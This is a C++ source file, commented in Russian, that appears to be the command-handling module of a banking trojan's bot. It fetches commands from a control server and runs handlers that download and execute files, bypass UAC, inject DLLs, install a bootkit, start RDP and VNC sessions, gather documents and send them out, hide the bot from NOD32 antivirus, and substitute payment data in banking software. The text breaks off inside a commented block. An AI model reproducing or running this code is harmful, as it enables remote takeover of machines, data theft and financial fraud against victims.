//---------------------------------------------------------------------------
#include <windows.h>

#include "Task.h"
#include "Memory.h"
#include "Strings.h"
#include "Loader.h"
#include "BotUtils.h"
#include "GetApi.h"
#include "BotClasses.h"
#include "Config.h"
#include "Utils.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotHosts.h"
#include "BotCore.h"
#include "Plugins.h"
#include "DllLoader.h"
#include "CabPacker.h"
#include "BotDef.h"
#include "StrConsts.h"
#include "Installer.h"
#include "VideoRecorder.h"

#include <shlobj.h>
#include <shlwapi.h>

#include "Modules.h"
#include "killos_reboot.h"

#include "BotMonitorMsg.h"

//---------------------------------------------------------------------------
// Система вывода отладочной информации

#include "BotDebug.h"

namespace TASKDBGTEMPLATES
{
    #include "DbgTemplates.h"
}

#define TASKDBG TASKDBGTEMPLATES::DBGOutMessage<>


//---------------------------------------------------------------------------

typedef struct TTaskManager
{
	PCHAR URL;                  // Адрес откуда будут браться команды
	DWORD Interval;             // Интервал получения команд (ьиллисекунд);
	LPCRITICAL_SECTION Lock;    // Секция блокирования
	PList RegisteredCommands;   // Список зарегистрированных команд
	HANDLE CommandsThread;      // Поток отложенного выполнения команд
	HANDLE CommandEvent;        // Собитие добавления новой команды в список
	PList CommandsList;         // Список команд ожидающий выполнения
	bool Terminated;            // Признак прерванной работы

} *PTASKMANAGER;


typedef struct TRegisteredCommand
{
   PCHAR Name;
   TCommandMethod Method;
} *PRegisteredCommand;

typedef struct TCommand
{
	PCHAR Command;
    PCHAR Args;
} *PCommand;


// Глобальный енеджер задач
//HANDLE GLManagerPID = NULL;
PTaskManager GlobalTaskManager = NULL;
DWORD TaslManagerProcess = 0;

//---------------------------------------------------------------------------
PTaskManager GetGlobalTaskManager(bool Initialize)
{
	// Возвращаем указатель на глобальный менеджер задач
	if (IsNewProcess(TaslManagerProcess))
		GlobalTaskManager = NULL;

	if (GlobalTaskManager == NULL && Initialize)
        InitializeTaskManager(NULL, true);

	return GlobalTaskManager;
}

//---------------------------------------------------------------------------

void FreeCommand(LPVOID C)
{
	STR::Free(PCommand(C)->Command);
	STR::Free(PCommand(C)->Args);
    FreeStruct(C);
}
//----------------------------------------------------------------------------

void FreeRegisteredCommand(LPVOID C)
{
	STR::Free(PRegisteredCommand(C)->Name);
    FreeStruct(C);
}
//----------------------------------------------------------------------------


bool InitializeTaskManager(PTaskManager *Manager, bool RegisterCommands)
{
	// Создать менеджер команд
	if (IsNewProcess(TaslManagerProcess))
		GlobalTaskManager = NULL;

	PTASKMANAGER M = CreateStruct(TTaskManager);
	if (M == NULL)
		return false;

	M->Lock = CreateStruct(RTL_CRITICAL_SECTION);
	pInitializeCriticalSection(M->Lock);

	if (Manager == NULL)
        Manager = &GlobalTaskManager;

	*Manager = (PTaskManager)M;

	if (RegisterCommands)
		RegisterAllCommands(*Manager, COMMAND_ALL);

	return true;
}

//----------------------------------------------------------------------------

void FreeTaskManager(PTaskManager Manager)
{
	// Уничтожаем менеджер задач
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
	{
		M = (PTASKMANAGER)GetGlobalTaskManager(false);
		GlobalTaskManager = NULL;
	}

	if (M == NULL) return;


    StopTaskManager(Manager);
	pDeleteCriticalSection(M->Lock);
	FreeStruct(M->Lock);
    FreeStruct(M);
}

//----------------------------------------------------------------------------
PRegisteredCommand GetRegisteredCommand(PTASKMANAGER M, PCHAR CommandName)
{
	// Ищем команду по имени
    PRegisteredCommand C;
	DWORD Count = List::Count(M->RegisteredCommands);
	for (DWORD i = 0; i < Count; i++)
	{
		C = (PRegisteredCommand)List::GetItem(M->RegisteredCommands, i);
		if (StrSame(C->Name, CommandName, false))
			return C;
	}

	return NULL;
}

//----------------------------------------------------------------------------
bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Method)
{
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);

	if (M == NULL || STR::IsEmpty(CommandName) || Method == NULL ||
		GetRegisteredCommand(M, CommandName) != NULL)
		return false;


	// Создаём описание команды
	pEnterCriticalSection(M->Lock);

	if (M->RegisteredCommands == NULL)
	{
		M->RegisteredCommands = List::Create();
		List::SetFreeItemMehod(M->RegisteredCommands, FreeRegisteredCommand);
    }

	PRegisteredCommand C = CreateStruct(TRegisteredCommand);
	if (C != NULL)
	{
		C->Name = STR::New(CommandName);
		C->Method = Method;
    }
    List::Add(M->RegisteredCommands, C);

	pLeaveCriticalSection(M->Lock);

	return C != NULL;
}
//----------------------------------------------------------------------------

DWORD WINAPI ExecuteCommandsProc(LPVOID Data)
{
	// Процедура потока выполнения комманд
	PTASKMANAGER M = (PTASKMANAGER)Data;
	PCommand Command;
	do
	{
		// Ожидаем события
		pWaitForSingleObject(M->CommandEvent, INFINITE);

		if (!M->Terminated)
		{
            // Получаем следующую команду
			pEnterCriticalSection(M->Lock);

			Command = (PCommand)List::Extract(M->CommandsList, 0);
			// В случае если список пустой сбрасываем событие
			if (List::Count(M->CommandsList) == 0)
				pResetEvent(M->CommandEvent);

			pLeaveCriticalSection(M->Lock);

			// Выполняем команду
			ExecuteCommand(NULL, Command->Command, Command->Args, false);

			FreeCommand(Command);
        }
	}
	while (!M->Terminated);
	pExitThread(0);
    return 0;
}

//----------------------------------------------------------------------------

void CreateTaskThread(PTASKMANAGER M)
{
	// Создать необходимые данные для отложенного выполнения команд
	if (M->CommandsThread != NULL)
		return;
	M->CommandsList = List::Create();
	List::SetFreeItemMehod(M->CommandsList, FreeCommand);
	M->CommandEvent = pCreateEventA(NULL, true, false, NULL);
	M->CommandsThread = pCreateThread(NULL, 512, ExecuteCommandsProc, M, 0, NULL);
}
//----------------------------------------------------------------------------

bool TaskManagerSleep(PTaskManager Manager)
{
	// Заснуть на необходимыи интервал

	PTASKMANAGER M = NULL;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(false);
	if (M == NULL || M->Terminated)
		return false;

	// Определяем интервал
	DWORD Interval = M->Interval;

	if (Interval == 0)
		Interval = GetDelay() * 60 * 1000;

	if (Interval == 0)
		Interval = 60*1000;


	// Спим
	DWORD SleepTime = 0;
	while (SleepTime < Interval && !M->Terminated)
	{
		pSleep(1000);
        SleepTime += 1000;
	}

    return !M->Terminated;
}

//----------------------------------------------------------------------------

//bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
//{
//	/*   Запускаем цикл обработки команд  */
//
//	// Инициализируем менеджер выполнения команд
//	PTASKMANAGER M;
//	if (Manager != NULL)
//		M = (PTASKMANAGER)Manager;
//	else
//		M = (PTASKMANAGER)GetGlobalTaskManager(true);
//
//
//	// Регистрируем известные команды
//	if (InitCommands)
//		RegisterAllCommands(M, COMMAND_ALL);
//
//	PCHAR RealURL = URL;
//	bool SelfURL = URL == NULL;
//
//	// Запускаем цикл обработки
//	do
//	{
//		if (SelfURL)
//			RealURL = GetBotScriptURL(SCRIPT_TASK);
//
//		// Загружаем и выполняем команду
//		if (RealURL != NULL)
//			DownloadAndExecuteCommand(M, RealURL);
//
//		if (SelfURL)
//			STR::Free(RealURL);
//		// Спим до выполнения следующей команды
//		if (!M->Terminated)
//	        TaskManagerSleep(M);
//
//
//	}
//	while (!M->Terminated);
//	return true;
//}

//----------------------------------------------------------------------------

void StopTaskManager(PTaskManager Manager)
{
	// Прервать работу менеджера задач
	if (Manager == NULL)
		Manager = GetGlobalTaskManager(false);
	if (Manager == NULL) return;

	PTASKMANAGER M = (PTASKMANAGER)Manager;
	pEnterCriticalSection(M->Lock);

	if (M->CommandsThread)
	{
		// Поток работает, останавливаеь
		M->Terminated = true;
		pSetEvent(M->CommandEvent);
		pWaitForSingleObject(M->CommandsThread, 1000);

		pCloseHandle(M->CommandEvent);
		pCloseHandle(M->CommandsThread);
		List::Free(M->CommandsList);

		M->CommandEvent = NULL;
		M->CommandsThread = NULL;
		M->CommandsList = NULL;
	}

	pLeaveCriticalSection(M->Lock);
}
//----------------------------------------------------------------------------

/*
bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
{
	// Загрузить команду/ набор команд
	bool GenerateURL = STR::IsEmpty(URL);

	if (GenerateURL)
		URL = GetBotScriptURL(SCRIPT_TASK);

	string BotID = GenerateBotID2(GetPrefix(true).t_str());

	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());

	PStrings Fields = Strings::Create();

	AddURLParam(Fields, "id", BotID.t_str());
	AddURLParam(Fields, "ver", (PCHAR)BOT_VERSION);

	THTTPResponseRec Response;
	ClearStruct(Response);

	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();
		bool Result = CryptHTTP::Post(URL, Password, Fields, HTMLCode, &Response);
        STR::Free(Password);
	#else
    	bool Result = HTTP::Post(URL, Fields, HTMLCode, &Response);
	#endif

	if (Result)
	{

		if (Response.Code != 200)
		{
			if (HTMLCode != NULL)
			{
				STR::Free(*HTMLCode);
				*HTMLCode = NULL;
            }
			TASKDBG("Task", "Для бота отсутствуют команды");
			MONITOR_MSG(BMCONST(TaskNoCommands), NULL);
		}
	}
	else
		TASKDBG("Task", "Ошибка загрузки команд. Сервер недоступен");

    HTTPResponse::Clear(&Response);
	Strings::Free(Fields);


	if (GenerateURL)
		STR::Free(URL);

    return Result;
}
//----------------------------------------------------------------------------

*/

bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
{
	// Загрузить команду/ набор команд
	bool GenerateURL = STR::IsEmpty(URL);

	if (GenerateURL)
		URL = GetBotScriptURL(SCRIPT_TASK);

	string BotID = GenerateBotID2(GetPrefix(true).t_str());

	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());


	TBotStrings Fields;

	Fields.AddValue("id", BotID);
//    Fields.AddValue("ver", BOT_VERSION);

	#ifdef CryptHTTPH
		TCryptHTTP HTTP;
		HTTP.Password = GetMainPassword2();
	#else
		THTTP HTTP;
	#endif

	// Загружаем команду

	string Cmd;
	bool Result = HTTP.Post(URL, &Fields, Cmd);

	if (Result && !Cmd.IsEmpty())
	{
		// Для совместимости
		if (HTMLCode)
			*HTMLCode = STR::New(Cmd.t_str());
	}
	else
	{
		TASKDBG("Task", "Для бота отсутствуют команды");
		MONITOR_MSG(BMCONST(TaskNoCommands), NULL);
	}

	if (GenerateURL)
		STR::Free(URL);

    return Result;
}
//----------------------------------------------------------------------------




bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
{
	// Загрузить и выполнить команду

	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);


	// Загружаем команду
	PCHAR Command = NULL;
	bool Result = false;

	if (DownloadCommand(URL, &Command))
	{
		if (Command != NULL)
		{
			Result = ExecuteCommand(M, Command);
			STR::Free(Command);
		}
	}

    return Result;
}
//----------------------------------------------------------------------------

void DoAfterExecuteCommand(PTASKMANAGER Manager, PCHAR Command, PCHAR Args, bool Executed)
{
	// событие уведомления об исполнении команды
/* 	PCHAR  prefix;
	if (Executed)
		prefix = "выполнено";
	else
		prefix = "не выполнено";

    DbgMsg("task", 0, "%s %s ( %s )", prefix, Command, Args);*/
}
//---------------------------------------------------------------------------



bool InvalidChar(char c)
{
	return c == 10 ||
		   c == 13 ||
		   c == 9 ||
		   c == 32;
}

bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
{
	// Рапарсивает HTML строку на команду и аргументы
	if (HTML == NULL)
		return false;

	Args = STR::GetRightStr(HTML, " ");

	if (Args != NULL)
	{
		Command = STR::GetLeftStr(HTML, " ");
		bool Changed = false;
		// Обрезаем лишние символы
		DWORD Len = STR::Length(Args);
		PCHAR Tmp = Args + (Len - 1);
		while (Tmp != Args && InvalidChar(*Tmp))
		{
            *Tmp = 0;
			Tmp--;
			Changed = true;
		}
		if (Changed)
		{
			Tmp = Args;
			Args = STR::New(Tmp);
			STR::Free(Tmp);
		}
	}
	else
		Command = STR::New(HTML);
    return Command != NULL;
}
//---------------------------------------------------------------------------

bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
{

	// Раcпарсить HTML и выполнить команду
	if (STR::IsEmpty(HTML))
		return false;

	PStrings S = Strings::Create();
	Strings::SetText(S, HTML);
	DWORD Count = Strings::Count(S);

	bool Res = false;
	PCHAR Command = NULL;
	PCHAR Args = NULL;
    PCHAR Line = NULL;

	for (DWORD i = 0; i < Count; i++)
	{
		Line = Strings::GetItem(S, i, false);
		//
		//  команды начинающиеся с символа ; игнорируются
		//
		if (!STR::IsEmpty(Line) && *Line != ';')
		{
			ParseCommand(Line, Command, Args);

			if (!STR::IsEmpty(Command))
			{
				TASKDBG("Task", "Выполняем команду: %s", Line);

				bool Executed = ExecuteCommand(Manager, Command, Args, Deferred);
				if (Executed)
				{
                    MONITOR_MSG(BMCONST(TaskExecCommandOk), Line);
                	TASKDBG("Task", "Команда успешно выполнена");
					Res = true;
				}
				else
                	MONITOR_MSG(BMCONST(TaskExecCommandEr), Line);
            }

			STR::Free2(Command);
			STR::Free2(Args);
        }
	}
	Strings::Free(S);

	return Res;
}

//---------------------------------------------------------------------------

bool ExecuteDeferredCommand(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Добавить команду в список отложенного выполнения менеджера задач
	PTASKMANAGER M =(PTASKMANAGER)Manager;
	if (M == NULL || Command == NULL)
		return false;

	pEnterCriticalSection(M->Lock);

	// Запускаем поток
	CreateTaskThread(M);

	// Создаём комаенду и добавляем её в список
	PCommand C = CreateStruct(TCommand);
	C->Command = STR::New(Command);
	C->Args = STR::New(Args);

	List::Add(M->CommandsList, C);
	pSetEvent(M->CommandEvent);

	//
	pLeaveCriticalSection(M->Lock);

	return true;
}
//----------------------------------------------------------------------------

TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command);
//----------------------------------------------------------------------------

bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
{
	TASKDBG("Task", "ExecuteCommand: manager=0x%X command='%s' args='%s' defered=%d", 
		Manager,
		((Command == NULL) ? "(null)":Command),
		((Args == NULL) ? "(null)":Args),
		Deferred
		);


	// Выполнить команду Command с аргументами Args
	// В случае если Deferred == true выполнение команды будет передано
	// В поток выполнения
	if (Command == NULL)
		return false;

	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);


	// Определяем метод команды
	TCommandMethod Method = GetCommandMethod(M, Command);

	TASKDBG("Task", "ExecuteCommand: GetCommandMethod return 0x%X", Method);
	if (Method == NULL)
		return false;

    // Добавляем команду в список отложенных команд
	if (Deferred && M != NULL)
	{
		// Отправляем на отложенное выполнение
		ExecuteDeferredCommand(M, Command, Args);
		return true;
    }

	// Выполняем команду
   	bool Result = Method(M, Command, Args);

	// Вызываем событие выполнения команды
	DoAfterExecuteCommand(M, Command, Args, Result);


	return Result;

}
//---------------------------------------------------------------------------


//--------------------------  Обработчики команд -------------------------//

bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Загрузить и выполнить файл

	if (Args == NULL)
		return false;

	PWCHAR FileName = GetTempName();
	TASKDBG( "Download", "file: %ls, args: %s", FileName, Args );

	if ( FileName)
	{
		ExecuteFile(Args, FileName);
		MemFree(FileName);
		return true;
	}

	return false;
}

//загрузить и выполнить файл после обхода UAC
bool ExecuteDownload2(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
#ifdef UAC_bypassH
	if( !RunBotBypassUAC( 0, 2, Args ) )
		return ExecuteDownload( Manager, Command, Args );
	return true;
#else
	return ExecuteDownload( Manager, Command, Args );
#endif //UAC_bypassH
}


bool ExecuteUpdateConfig(PTaskManager, PCHAR Command, PCHAR Args)
{
	// Загрузить конфигурационный файл
	#ifdef BotConfigH
		return Config::Download(Args);
	#else
		return false;
	#endif
}


DWORD WINAPI DoExecuteUpdate(string *ArgsPtr)
{
	// Загрузить обновление
	string Args(*ArgsPtr);
	delete ArgsPtr;
	bool DeleteSettings = Args.Hash(0, true)  == 0x18766C /* all */;
	#ifdef BOTPLUG
		if( UpdateBotPlug() )
			if (DeleteSettings) BOT::DeleteSettings();
	#else
		string FileName = File::GetTempName2A();
		if (FileName.IsEmpty()) return 0;

		// Загружаем обновление
		TBotFileStream File(FileName.t_str(), fcmCreate);

		THTTP HTTP;
		bool Result = HTTP.Get(Args.t_str(), &File);

		File.Close();

		if (Result)
			Result = BOT::MakeUpdate(FileName.t_str(), DeleteSettings);
	#endif
	return 0;
}

bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
{
	StartThread(DoExecuteUpdate, new string(Args));
	return true;
}



bool ExecuteLoadDLL(PTaskManager, PCHAR Command, PCHAR Args)
{
	// Команда на загрузку библиотеки
	WCHAR *FileName = GetTempName();

	if (FileName == NULL)
		return false;

	bool Result = false;
	if ( DownloadInFile(Args, FileName ) && FileExistsW(FileName))
		Result = InjectDll(FileName );

	MemFree(FileName);
	return Result;
}

bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
{
	char fileName[MAX_PATH];
	File::GetTempName( fileName, 0 );
	char* url = m_strstr( Args, "://" );
	BYTE* data = 0;
	DWORD size = 0;
	if( url == 0 ) //качаем из админки
		data = Plugin::Download( Args, NULL, &size, false );
	else //качаем по урлу
		if( !DownloadInMem( Args, &data, &size ) )
			data = 0;
	bool res = false;
	if( data )
	{
		if( File::WriteBufferA( fileName, data, size ) == size )
		{
			HMODULE dll = (HMODULE)pLoadLibraryA(fileName);
			if( dll )
			{
				typedef void (WINAPI *tfunc)(void*);
				tfunc func = (tfunc)pGetProcAddress( dll, "PluginMain" );
				if( func )
				{
					func(0);
					res = true;
				}
			}
		}
		MemFree(data);
	}
	return res;
}

static DWORD WINAPI ProcessDocFind(void*)
{
	BOT::Initialize(ProcessUnknown);

	typedef BOOL (WINAPI *typeBuildStubDllMain)(HANDLE DllHandle, DWORD Reason, LPVOID);
	BYTE* data = 0;
	DWORD size = 0;
	data = Plugin::Download( "docfind.plug", 0, &size, false );
	bool res = false;
	if( data )
	{
		//File::WriteBufferA( "c:\\docfind.plug", data, size );
		HMEMORYMODULE module = MemoryLoadLibrary(data);
		if( module )
		{
			DWORD* gAltEPOffs = (DWORD*)MemoryGetProcAddress(module, "gAltEPOffs" );
			if( gAltEPOffs )
			{
				typeBuildStubDllMain func = (typeBuildStubDllMain)gAltEPOffs[0];
				if( func )
				{
					TASKDBG( "Task", "Выполняется команда docfind" );
					HANDLE hEvent = pCreateEventA( NULL, FALSE, FALSE, "Global\\_SearchComplete32" );
					func( 0, DLL_PROCESS_ATTACH, 0 );
					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
					pCloseHandle(hEvent);

					func( 0, DLL_PROCESS_DETACH, 0 );

					char path[MAX_PATH], tmpName[MAX_PATH];
					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
					pPathAppendA( path, "search" );
					TASKDBG( "Task", "Поиск файлов завершен, отправляем папку %s", path );
					//отправляем если папка не пустая
					if( !pPathIsDirectoryEmptyA(path) )
					{
						File::GetTempName(tmpName);
						HCAB cab = CreateCab(tmpName);
						AddDirToCab( cab, path, "docfind" );
						CloseCab(cab);
						TASKDBG( "Task", "сформирован cab файл %s", tmpName );
						DataGrabber::SendCabDelayed( 0, tmpName, "docfind" );
						pDeleteFileA(tmpName);
					}
					else
						TASKDBG( "Task", "Папка %s пустая", path );
					Directory::Delete(path);
				}
			}
			MemoryFreeLibrary(module);
		}
		MemFree(data);
	}
	return 0;
}

//Загружает плагин (dll) который запускается в отдельном процессе и производит поиск по всем дискам
//в поисках текстовых документов по заложенной внутри плагина маске, поиск ведется также и в архивах.
//Запускаем в отдельном процессе, а не в текущем из-за того что плагин может нестабильно работать
//из-за чего бот может вылететь
bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
{
	MegaJump(ProcessDocFind);
	return true;
}

bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// Запустить множественную загрузку файлов
	return false;

  /*		char * cPointer= m_strstr(&Buffer[1],"http:");
		if (LoadExe==NULL)
		{

			LoadExe = (char*)MemAlloc(m_lstrlen(cPointer))+1+4;
			m_lstrncpy(LoadExe,"exe=",4);
			m_lstrcat( LoadExe, cPointer );
		}
		else
		{
			LoadExe=(char*)MemRealloc(LoadExe,m_lstrlen(cPointer)+m_lstrlen(LoadExe)+1);
			m_lstrcat( LoadExe, cPointer );
		}

		char* cUrl=Buffer;
		char* cUrlNext;
		int i;
		char *DownloadUrl;
		while (true)
		{
			cUrl= m_strstr(&cUrl[1],"http:");
			if (cUrl==NULL)break;
			cUrlNext= m_strstr(cUrl,"|");
			i=m_lstrlen(cUrl)-m_lstrlen(cUrlNext);
			DownloadUrl = (char*)MemAlloc(i)+1;
			m_lstrncpy(DownloadUrl,cUrl,i);
			DownloadUrl[i]='\0';


			if ( DownloadUrl )
			{


				WCHAR *FileName =(WCHAR *)GetTempName();

				if ( FileName && DownloadUrl )
				{
					ExecuteFile( DownloadUrl, FileName );
				}

				MemFree( FileName );
			}

			MemFree( DownloadUrl );
		}
    */

}


bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// выполнить команду alert
	pMessageBoxA(0, Args, NULL, MB_OK | MB_ICONINFORMATION);
	return true;
}


//---------------------------------------------------------
//  InstallBotPlug - Функция загружает  бота в виде длл и
//                   устанавливает его с помощью инсталятор
//
//  InstallerName  - имя инсталятора
//---------------------------------------------------------
DWORD WINAPI InstallBotPlug(const string *InstallerName)
{
	TASKDBG("BotPlugInstaller", "Начинаем инсталяцию bot.plug инстялятором %s", InstallerName->t_str());

	TPlugin Intaller(*InstallerName);

	delete InstallerName;

	void* dllBody;
	DWORD dllSize;
	if( !LoadBotPlug( &dllBody, &dllSize ) ) return FALSE;

	// Загружаем плагин
	if (!Intaller.Download(true)) return FALSE;

	TASKDBG("BotPlugInstaller", "Плагин успешно загружен, начинаем инсталцию");

	// Запускаем инсталяцию
	typedef BOOL (WINAPI *TInstall)(BYTE* DllBody, DWORD DllSize);

	BOOL Result = FALSE;

	TInstall Install;
	if (Intaller.GetProcAddress(0x3E99511B /* Install */, (LPVOID&)Install))
		Result = Install((LPBYTE)dllBody, dllSize) != FALSE;

	if (Result)
		TASKDBG("BotPlugInstaller", "Инсталяция успешно выполнена");

	MemFree(dllBody);
	return Result;

}

//----------------------------------------------------------------------------

bool ExecuteInstallBootkit(void* Manager, PCHAR Command, PCHAR Args)
{
	// Функция инсталирует буткит
	StartThread(InstallBotPlug, new string(GetStr(EStrBootkitInstaller)));
    return true;
}
//----------------------------------------------------------------------------

bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
{
	// Функция инсталирует фэкедлл
	if (!BOT::FakeDllInstalled())
		StartThread(InstallBotPlug, new string(GetStr(EStrFakeDllInstaller)));
	return true;
}
//----------------------------------------------------------------------------

static bool IP_Downtime( const char* args, char* ip, int& port, int& downtime )
{
	char* p = STR::Scan( args, ' ' );
	int lenAddr = p ? p - args : m_lstrlen(args);
	if( lenAddr >= 24 ) return false;
	int lenIP = lenAddr;
	p = STR::Scan( args, ':' );
	if( p )
	{
		lenIP = p - args;
		port = m_atoi(p + 1);
	}
	else
		port = 0;
	m_memcpy( ip, args, lenIP );
	ip[lenIP] = 0;
	downtime = m_atoi(args + lenAddr);
	if( downtime == 0 )
		downtime = 24 * 60; //по умолчанию в режиме простоя сутки
	return true;
}

//команда на подключение к видео серверу, просто шлем лог, его отсылка активизирует подключение к серверу
bool ExecuteRS(void* Manager, PCHAR Command, PCHAR Args)
{
	#ifdef VideoRecorderH
		char ip[24];
		int downtime, port;
		if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
		TASKDBG("RS", "ip: %s, port: %d, downtime %d", ip, port, downtime);
		VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
	#endif
	return true;
}

//загружает и запускает RDP.DLL
bool ExecuteRDP(void* Manager, PCHAR Command, PCHAR Args)
{
	#ifdef VideoRecorderH
		char ip[24];
		int downtime, port;
		if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
		TASKDBG("RDR", "ip: %s, port: %d, downtime %d", ip, port, downtime);
		HANDLE mutex = TryCreateSingleInstance("RDP");
		if( mutex ) //длл не запущена, запускаем
		{
			pCloseHandle(mutex);
			MegaJump(VideoProcess::ProcessRDP);
		}
		else
			TASKDBG( "RDR", "RDP уже запущен" );
		VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
	#endif
	return true;
}

//загружает и запускает VNC.EXE
bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
{
/*
	char ip[24];
	int downtime, port;
	if( !IP_Downtime( Args, ip, port, downtime ) ) return false;
	TASKDBG("VNC", "ip: %s, port: %d, downtime %d", ip, port, downtime);
	HANDLE mutex = TryCreateSingleInstance("VNC");
	if( mutex ) //vnc не запущена, запускаем
	{
		pCloseHandle(mutex);
		MegaJump(VideoProcess::ProcessVNC);
	}
	else
		TASKDBG( "VNC", "VNC уже запущен" );
	VideoProcess::Init( TVideoRecDLL::RunCallback, ip, port, downtime );
*/
	return true;
}

//создание файла для подмены в IFobs
bool ExecuteIFobs(void* Manager, PCHAR Command, PCHAR Args)
{
#ifdef IFobsH
	if( StrSame( Args, "del" ) )
		IFobs::DeletePlugins();
	else
		IFobs::CreateFileReplacing(Args);

#endif
	return TRUE;
}

//загрузка указанной папки на видео сервер
bool ExecuteLF(void* Manager, PCHAR Command, PCHAR Args)
{
	#ifdef VideoRecorderH
		char name[MAX_PATH];
		PathToName( Args, name, sizeof(name) );
		TASKDBG( "LF", "Загрузка папки '%s' под именем %s", Args, name );
		VideoProcess::SendFiles( 0, name, Args, 0, 0, true );
	#endif
	return true;
}

bool ExecuteExec(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	if( RunFileA(Args) )
	{
		TASKDBG( "Exec", "true" );
		return true;
	}
	else
	{
		int err = pGetLastError();
		TASKDBG( "Exec", "error %d", err );
		return false;
	}
}


//--------------------------------------------------
//  Функция обновляет плагин бота bot.plug
//--------------------------------------------------
bool ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
     return UpdateBotPlug() != FALSE;
}


DWORD WINAPI ThreadAddTrust( char* nameFile )
{
	BYTE* data = 0;
	DWORD size = 0;
	data = Plugin::Download( "addtrust.plug", 0, &size, false );
	if( data )
	{
		bool reboot = true;
		int len = m_lstrlen(nameFile);
		if( len >= 9 )
		{
			if( m_lstrncmp( nameFile, "notreboot", 9 ) )
			{
				TASKDBG( "AddTrust", "Отключен ребут" );
				reboot = false;
				nameFile += 10;
				len -= 10;
				while( *nameFile == ' ' ) nameFile++, len--;
			}
		}
		wchar_t* nameIgnore;
		int lenIgnore;
		if( len < 5 ) //если не указан файл, то берем имя файла в автозагрузке
		{
			nameIgnore = AnsiToUnicode( BOT::GetBotFullExeName().t_str(), 0 );
			lenIgnore = WSTR::CalcLength(nameIgnore);
		}
		else
		{
			nameIgnore = AnsiToUnicode( nameFile, len );
			lenIgnore = len;
		}
		TASKDBG( "AddTrust", "Загрузили addtrust.plug" );
		int szIgnore = sizeof(wchar_t) * (lenIgnore + 1); //размер памяти в которой находится строка
		wchar_t* metka = L"NOD32 ignore file";
		int lenMetka = WSTR::CalcLength(metka);
		void* p = m_memmem( data, size, metka, sizeof(wchar_t) * (lenMetka + 1) );
		if( p )
		{
			TASKDBG( "AddTrust", "Вставили %ls", nameIgnore );
			m_memcpy( p, nameIgnore, szIgnore );
			char pathFile[MAX_PATH];
			File::GetTempName(pathFile);
			if( File::WriteBufferA( pathFile, data, size ) == size )
			{
				TASKDBG( "AddTrust", "Сохранили плагин в %s", pathFile );
				RunFileA( pathFile, true );
				TASKDBG( "AddTrust", "Плагин выполнился" );
				pSleep(1000);
				pDeleteFileA(pathFile);
				if( reboot ) Reboot();
			}
		}
		MemFree(nameIgnore);
		MemFree(data);
	}
	return 0;
}

bool ExecuteAddTrust(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	RunThread( ThreadAddTrust, Args );
	return true;
}


bool ExecuteCBank(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
#ifdef BBSCBankH
	TASKDBG( "CBank", "%s", Args );
	int c_args = m_lstrlen(Args);
	//сохраняем переданный баланс и платежки
	File::WriteBufferA( BOT::MakeFileName( 0, GetStr(CBankReplacement).t_str() ).t_str(), Args, c_args + 1 );
	//уставливаем флаг для запуска подмены
	Bot->CreateFileA( 0, GetStr(CBankFlagUpdate).t_str() );
#endif
	return true;
}

bool ExecuteTiny(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
#ifdef TinyH
	TASKDBG( "Tiny", "%s", Args );
	int c_args = m_lstrlen(Args);
	//сохраняем переданный баланс и платежки
	File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyReplacement).t_str() ).t_str(), Args, c_args + 1 );
	//уставливаем флаг для запуска подмены
	Bot->CreateFileA( 0, GetStr(TinyFlagUpdate).t_str() );
#endif
	return true;
}

/*

// Тело потока команды installfakedll
void AsyncInstallFakeDll(void* Arguments)
{
	PCHAR ParamList = (PCHAR)Arguments;

	// В параметрах идет обязательные параметрами PlugName, BotPlugName и 
	// необязательный параметр Target
	string InstallerPlugName = GetCommandParamByIndex(ParamList, 0);
	string BotPlugName       = GetCommandParamByIndex(ParamList, 1);
